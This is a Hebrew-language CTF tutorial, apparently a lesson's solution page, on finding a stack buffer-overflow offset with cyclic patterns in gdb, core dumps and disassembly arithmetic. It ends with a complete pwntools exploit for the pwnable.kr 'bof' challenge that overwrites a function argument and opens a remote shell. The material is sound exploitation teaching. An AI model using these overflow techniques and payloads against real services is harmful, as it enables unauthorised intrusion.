## פתרון - מציאת ה-offset בשלוש דרכים

נעבור על שלוש השיטות בזו אחר זו. שימו לב שכולן צריכות להחזיר את אותו מספר: 72. אם קיבלתם משהו אחר באחת מהן, כנראה שקראתם מהאוגר הלא נכון או ספרתם שדה פעמיים. בסוף נפתור גם את תרגיל הבונוס bof.

תזכורת על הבינארי: `buf[64]` על מחסנית של 64 ביט, בלי canary ובלי PIE. לכן ה-offset הצפוי הוא 64 בתים של החוצץ ועוד 8 בתים של saved rbp, סך הכל 72.

---

### פתרון תרגיל 1 - offset עם cyclic ב-gdb

ראשית מייצרים את קובץ הרצף:

```python
from pwn import *
context.arch = 'amd64'
open('pat', 'wb').write(cyclic(200))
```

מריצים תחת gdb ומזינים את הקובץ:

```bash
gdb ./vuln
```

```text
pwndbg> run < pat

Program received signal SIGSEGV, Segmentation fault.
...
*RIP  0x61616173616161...
*RSP  0x7fffffffe1c8
```

התוכנית קרסה על ה-`ret`, כי הערך שנדרס על כתובת החזרה אינו כתובת חוקית. קוראים את 4 הבתים התחתונים של RIP ומתרגמים ל-offset:

```text
pwndbg> cyclic -l 0x61616173
Finding cyclic pattern of 4 bytes: b'saaa' (hex: 0x73616161)
Found at offset 72
```

אותו דבר מ-Python, נוח לאוטומציה:

```python
>>> from pwn import *
>>> context.arch = 'amd64'
>>> cyclic_find(0x61616173)
72
```

**למה זה עבד / איך להכליל:** ברצף דה-ברוין כל חלון של 4 בתים ייחודי, אז ה-4 בתים שנחתו על RIP מזהים באופן חד-משמעי את המיקום שממנו הם באו. זו הדרך המהירה ביותר כשיש לכם gdb בהישג יד. הכלל: להריץ עם הרצף, לקרוא את הערך שנדרס, לתרגם עם `cyclic -l` או `cyclic_find`. ב-64 ביט לוקחים תמיד את 32 הביט התחתונים.

---

### פתרון תרגיל 2 - offset מתוך core dump

מגדירים את הסביבה לכתיבת core:

```bash
ulimit -c unlimited
cat /proc/sys/kernel/core_pattern
# אם רואים משהו שמתחיל ב-|  (systemd-coredump / apport), משנים לקובץ פשוט:
echo core | sudo tee /proc/sys/kernel/core_pattern
```

מריצים מחוץ ל-gdb כדי לייצר את ה-core:

```bash
./vuln < pat
# Segmentation fault (core dumped)
ls -l core*
# -rw------- 1 user user ... core
```

הכיתוב `(core dumped)` מאשר שנוצר core. עכשיו מחלצים ממנו, קודם עם gdb:

```bash
gdb ./vuln core
```

```text
pwndbg> info registers rip
rip  0x61616173616161...

pwndbg> cyclic -l 0x61616173
Found at offset 72
```

ואותו דבר עם pwntools, בלי לפתוח gdb בכלל:

```python
from pwn import *
context.arch = 'amd64'

core = Coredump('./core')
log.info("RIP = %#x", core.rip)
offset = cyclic_find(core.rip & 0xffffffff)
log.success("offset = %d", offset)      # 72
```

ואפילו בלי לגעת ב-`ulimit` ידנית, כשמריצים את התהליך דרך pwntools הוא אוסף את ה-core לבד:

```python
from pwn import *
context.arch = 'amd64'

io = process('./vuln')
io.sendline(cyclic(200))
io.wait()
core = io.corefile
log.success("offset = %d", cyclic_find(core.rip & 0xffffffff))   # 72
```

**למה זה עבד / איך להכליל:** ה-core הוא תמונת מצב מלאה של הרגע שבו התהליך קרס, כולל כל האוגרים. לכן אפשר לחלץ ממנו את הערך שנדרס גם הרבה אחרי הקריסה ובלי לחזור על ההרצה. זו השיטה החשובה כשאין לכם gdb מחובר בזמן הקריסה, כמו בתקיפת שירות מרוחק שקרס אצלכם מקומית. שימו לב לשני המכשולים הנפוצים: `ulimit -c` שנשאר 0, ו-`core_pattern` ששולח את ה-core לשירות מערכת במקום לקובץ.

---

### פתרון תרגיל 3 - חישוב ידני מה-frame

מפרקים את הפונקציה:

```bash
objdump -d ./vuln | grep -A15 '<vuln>:'
```

```asm
0000000000401156 <vuln>:
  401156: push   rbp
  401157: mov    rbp,rsp
  40115a: sub    rsp,0x40
  40115e: lea    rax,[rbp-0x40]
  401162: mov    edx,0x100
  401167: mov    rsi,rax
  40116a: mov    edi,0x0
  40116f: call   401050 <read@plt>
```

קוראים את המפה מהדיסאסמבלי:

- ההוראה `lea rax,[rbp-0x40]` מגלה שהחוצץ `buf` מתחיל ב-`rbp-0x40`, כלומר 64 בתים מתחת ל-rbp השמור.
- האוגר השמור saved rbp יושב בדיוק ב-`rbp` (offset 0x40 מתחילת buf).
- כתובת החזרה יושבת ב-`rbp+8` (offset 0x40+8 מתחילת buf).

לכן המרחק מתחילת `buf` עד כתובת החזרה:

```text
0x40 (מ-buf עד saved rbp) + 8 (מ-saved rbp עד כתובת החזרה) = 0x48 = 72
```

בדיוק 72, כמו בשתי השיטות הקודמות.

**למה זה עבד / איך להכליל:** מבנה ה-frame קבוע וגלוי בקוד עצמו. ה-`lea` שמחשב את כתובת החוצץ הוא המפתח: הוא נותן את המיקום של `buf` יחסית ל-rbp, ומשם החישוב עד `rbp+8` הוא טריוויאלי. אל תיתנו לערך של `sub rsp, 0x40` לבלבל אתכם, לפעמים הוא גדול מגודל החוצץ בגלל יישור מחסנית, אבל אנחנו מודדים יחסית ל-rbp דרך ה-`lea`, אז זה לא רלוונטי. השיטה הזו מצוינת לאימות, ולמקרים שבהם אין לכם בכלל סביבת הרצה.

---

### פתרון תרגיל 4 (בונוס) - bof מ-pwnable.kr

מבנה הקוד של האתגר (מקוצר):

```c
void func(int key) {
    char overflowme[32];
    gets(overflowme);                 // גלישה
    if (key == 0xcafebabe) {
        system("/bin/sh");
    }
}
int main() {
    func(0xdeadbeef);
}
```

זה בינארי 32 ביט, וההבדל המהותי: הערך שאנחנו רוצים לשלוט בו הוא **הארגומנט** `key`, שנמצא על המחסנית **מעל** כתובת החזרה (כי 32 ביט מעביר ארגומנטים על המחסנית). לכן ה-offset שאנחנו מחפשים הוא מתחילת `overflowme` עד השדה של `key`, והוא עובר דרך saved ebp וכתובת החזרה בדרך.

מוצאים את ה-offset מקומית עם cyclic. מזינים רצף, מסתכלים איזה חלון נחת על השדה של `key` (אפשר לשים breakpoint על ההשוואה ולבדוק את הערך שם), ומתרגמים:

```python
from pwn import *
context.arch = 'i386'
# מזינים cyclic(64) לבינארי תחת gdb, שמים breakpoint על ההשוואה,
# קוראים את הערך שנמצא במקום של key, ומריצים:
# cyclic_find(<value>)  ->  52
```

ה-offset שיוצא הוא 52. עכשיו בונים את ה-exploit ושוגרים מול השירות המרוחק:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

OFFSET = 52
payload  = b'A' * OFFSET
payload += p32(0xcafebabe)        # דורסים את key בערך הקסם

# io = process('./bof')           # לבדיקה מקומית
io = remote('pwnable.kr', 9000)   # השירות המרוחק
io.sendline(payload)
io.interactive()
```

בתוך ה-shell שנפתח קוראים את ה-flag:

```bash
$ cat flag
```

**למה זה עבד / איך להכליל:** אותה שיטת cyclic בדיוק, רק שכאן מדדנו offset עד ארגומנט ולא עד כתובת החזרה. זה ההבדל המרכזי בין השיעור הזה למקרה הקלאסי: מה שאנחנו דורסים תלוי במבנה ה-frame ובקונבנציית הקריאה, ו-cyclic סופר את כל השדות שבדרך (saved ebp, כתובת החזרה) בשבילנו. הכלל שנשאר איתכם: קבעו קודם איזה שדה אתם רוצים לשלוט בו, מלאו ברצף, קראו איזה חלון נחת שם, ותנו ל-cyclic לתת לכם את המרחק המדויק. הזהירות היחידה: לוודא שקראתם את הערך מהמקום הנכון, כי offset לשדה אחד יכול להיות שונה ב-4 או 8 בתים מ-offset לשדה שכן לו.
